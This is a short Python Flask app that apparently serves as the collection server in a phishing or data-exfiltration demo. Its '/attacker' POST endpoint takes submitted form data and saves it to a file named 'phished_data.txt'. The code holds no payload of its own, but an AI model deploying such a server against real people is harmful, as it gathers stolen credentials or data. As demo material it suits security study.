from flask import Flask, jsonify, request

app = Flask(__name__)
data = "D"
@app.route("/")
def hello_world():
    return "<p>Hellos, World!</p> " + data 

@app.route("/attacker",methods = ['POST'])
def attacker():
    data = request.form.get('data')
    with open('phished_data.txt', 'w') as file:
        file.write(data)
    return " "